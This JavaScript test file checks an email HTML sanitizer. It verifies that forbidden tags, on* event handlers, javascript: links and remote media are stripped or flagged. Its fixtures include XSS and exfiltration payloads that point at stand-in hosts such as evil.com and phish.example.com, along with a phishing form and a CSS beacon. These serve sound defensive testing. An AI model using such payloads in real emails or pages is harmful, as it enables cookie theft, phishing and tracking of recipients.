/**
 * sanitize-extended.test.js
 *
 * Additional sanitization tests covering attack vectors not in sanitize.test.js:
 *   - FORBID_TAGS: iframe, form/input/button, object/embed, style, meta, base, link
 *   - Extra on*-handler attributes: onerror, onkeydown, onanimationstart, onsubmit
 *   - javascript: href stripping
 *   - Remote media attributes: srcset, poster
 *   - cid: URIs left intact (not a remote network fetch)
 *   - Multiple remote images: hasRemote=true, allowRemote preserves them
 *   - stripHtml edge cases
 */
import { sanitizeEmailBody, sanitizeEmailHtml, stripHtml } from '../components/sanitize.js'

// ---------------------------------------------------------------------------
// Forbidden tags
// ---------------------------------------------------------------------------
describe('sanitizeEmailBody — FORBID_TAGS', () => {
  it('strips <iframe> completely', () => {
    const { html } = sanitizeEmailBody(
      '<iframe src="https://evil.com" srcdoc="<script>pwn()</script>"></iframe>Safe',
    )
    expect(html).not.toContain('<iframe')
    expect(html).toContain('Safe')
  })

  it('strips <form> and <input> elements (phishing forms)', () => {
    const { html } = sanitizeEmailBody(
      '<form action="https://phish.example.com"><input type="text" name="password"/><button type="submit">Login</button></form>',
    )
    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
    expect(html).not.toContain('<button')
  })

  it('strips <object> and <embed> elements (plugin exploitation)', () => {
    const { html } = sanitizeEmailBody(
      '<object data="exploit.swf" type="application/x-shockwave-flash"></object>' +
      '<embed src="exploit.swf"/>',
    )
    expect(html).not.toContain('<object')
    expect(html).not.toContain('<embed')
  })

  it('strips <style> tags (CSS injection / exfiltration)', () => {
    const { html } = sanitizeEmailBody(
      '<style>body::after{content:url(https://beacon.example.com)}</style><p>Content</p>',
    )
    expect(html).not.toContain('<style')
    expect(html).toContain('Content')
  })

  it('strips <meta> refresh redirect tags', () => {
    const { html } = sanitizeEmailBody(
      '<meta http-equiv="refresh" content="0; url=https://evil.com"><p>Hello</p>',
    )
    expect(html).not.toContain('<meta')
    expect(html).toContain('Hello')
  })

  it('strips <base> href manipulation tags', () => {
    const { html } = sanitizeEmailBody(
      '<base href="https://evil.com/"><p>Content</p>',
    )
    expect(html).not.toContain('<base')
    expect(html).toContain('Content')
  })

  it('strips <link> elements (external stylesheet loading)', () => {
    const { html } = sanitizeEmailBody(
      '<link rel="stylesheet" href="https://evil.com/style.css"><p>Content</p>',
    )
    expect(html).not.toContain('<link')
    expect(html).toContain('Content')
  })
})

// ---------------------------------------------------------------------------
// Event-handler attributes (on*)
// ---------------------------------------------------------------------------
describe('sanitizeEmailBody — on* event-handler attributes', () => {
  it('strips onerror (image-based XSS)', () => {
    const { html } = sanitizeEmailBody('<img src="x" onerror="fetch(attacker)">')
    expect(html).not.toContain('onerror')
  })

  it('strips onload attribute', () => {
    const { html } = sanitizeEmailBody('<body onload="exfiltrate()"><p>Hi</p></body>')
    expect(html).not.toContain('onload')
  })

  it('strips onkeydown attribute', () => {
    const { html } = sanitizeEmailBody('<div onkeydown="steal()">Text</div>')
    expect(html).not.toContain('onkeydown')
    expect(html).toContain('Text')
  })

  it('strips onkeyup attribute', () => {
    const { html } = sanitizeEmailBody('<input onkeyup="record(event)">')
    expect(html).not.toContain('onkeyup')
  })

  it('strips onanimationstart attribute (CSS animation timing side-channel)', () => {
    const { html } = sanitizeEmailBody('<div onanimationstart="beacon()">Text</div>')
    expect(html).not.toContain('onanimationstart')
    expect(html).toContain('Text')
  })

  it('strips onsubmit (irrelevant after form removal, belt-and-suspenders)', () => {
    const { html } = sanitizeEmailBody(
      '<form onsubmit="exfiltrate(this)"><p>Content</p></form>',
    )
    expect(html).not.toContain('onsubmit')
    expect(html).not.toContain('<form')
  })

  it('strips onmouseover attribute', () => {
    const { html } = sanitizeEmailBody('<a href="https://example.com" onmouseover="track()">Click</a>')
    expect(html).not.toContain('onmouseover')
  })

  it('strips onfocus attribute', () => {
    const { html } = sanitizeEmailBody('<input onfocus="steal()">')
    expect(html).not.toContain('onfocus')
  })
})

// ---------------------------------------------------------------------------
// javascript: URL scheme
// ---------------------------------------------------------------------------
describe('sanitizeEmailBody — javascript: URL scheme', () => {
  it('neutralises javascript: href links (DOMPurify removes the href)', () => {
    const { html } = sanitizeEmailBody('<a href="javascript:alert(document.cookie)">Click me</a>')
    expect(html).not.toMatch(/href\s*=\s*["']javascript:/i)
  })

  it('neutralises JavaScript: with mixed case', () => {
    const { html } = sanitizeEmailBody('<a href="JavaScript:void(0)">Click</a>')
    expect(html).not.toMatch(/href\s*=\s*["']javascript:/i)
  })

  it('safe https:// hrefs survive and gain target=_blank', () => {
    const { html } = sanitizeEmailBody('<a href="https://example.com">Visit</a>')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })
})

// ---------------------------------------------------------------------------
// Remote media: srcset, poster, background attribute
// ---------------------------------------------------------------------------
describe('sanitizeEmailBody — remote media attributes', () => {
  it('strips srcset with a remote URL and sets hasRemote=true', () => {
    const { html, hasRemote } = sanitizeEmailBody(
      '<img alt="test" srcset="https://cdn.example.com/img.png 2x, https://cdn.example.com/img@3x.png 3x">',
    )
    expect(html).not.toContain('srcset')
    expect(hasRemote).toBe(true)
  })

  it('strips poster on video elements and sets hasRemote=true', () => {
    // <video> is not in FORBID_TAGS, so the element survives but poster is removed
    const { html, hasRemote } = sanitizeEmailBody(
      '<video poster="https://cdn.example.com/poster.jpg" controls></video>',
    )
    expect(html).not.toContain('poster')
    expect(hasRemote).toBe(true)
  })

  it('preserves srcset when allowRemote=true', () => {
    const { html, hasRemote } = sanitizeEmailBody(
      '<img alt="test" srcset="https://cdn.example.com/img.png 2x">',
      { allowRemote: true },
    )
    expect(html).toContain('srcset')
    expect(hasRemote).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// CID: URIs (inline email attachments — NOT remote)
// ---------------------------------------------------------------------------
describe('sanitizeEmailBody — cid: inline attachment URIs', () => {
  it('does not flag cid: image URIs as remote (they are local inline attachments)', () => {
    const { hasRemote } = sanitizeEmailBody('<img src="cid:image001@example.com" alt="logo">')
    expect(hasRemote).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Multiple remote images
// ---------------------------------------------------------------------------
describe('sanitizeEmailBody — multiple remote resources', () => {
  it('reports hasRemote=true when any remote image is present', () => {
    const { hasRemote } = sanitizeEmailBody(
      '<p>Hello</p><img src="https://tracker.example.com/px.gif" width="1" height="1">',
    )
    expect(hasRemote).toBe(true)
  })

  it('reports hasRemote=false for a clean plaintext-only email', () => {
    const { hasRemote } = sanitizeEmailBody('<p>No remote content here.</p>')
    expect(hasRemote).toBe(false)
  })

  it('allowRemote=true preserves all remote src attrs and still sets hasRemote', () => {
    const { html, hasRemote } = sanitizeEmailBody(
      '<img src="https://cdn.example.com/logo.png" alt="logo">',
      { allowRemote: true },
    )
    expect(html).toContain('src="https://cdn.example.com/logo.png"')
    expect(hasRemote).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// sanitizeEmailHtml (string variant)
// ---------------------------------------------------------------------------
describe('sanitizeEmailHtml', () => {
  it('returns a string, not an object', () => {
    const result = sanitizeEmailHtml('<p>Hello <script>alert(1)</script></p>')
    expect(typeof result).toBe('string')
    expect(result).not.toContain('<script')
    expect(result).toContain('Hello')
  })

  it('handles null input', () => {
    const result = sanitizeEmailHtml(null)
    expect(typeof result).toBe('string')
    expect(result).toBe('')
  })
})

// ---------------------------------------------------------------------------
// stripHtml
// ---------------------------------------------------------------------------
describe('stripHtml', () => {
  it('removes all HTML tags and returns plain text', () => {
    expect(stripHtml('<p>Hello <strong>world</strong></p>')).toBe('Hello world')
  })

  it('removes nested tags', () => {
    expect(stripHtml('<div><span><a href="#">Link text</a></span></div>')).toBe('Link text')
  })

  it('handles null safely', () => {
    expect(stripHtml(null)).toBe('')
  })

  it('handles undefined safely', () => {
    expect(stripHtml(undefined)).toBe('')
  })

  it('handles empty string', () => {
    expect(stripHtml('')).toBe('')
  })

  it('does not mutate the input (returns new string)', () => {
    const input = '<b>bold</b>'
    const result = stripHtml(input)
    expect(result).not.toBe(input)
    expect(result).toBe('bold')
  })
})
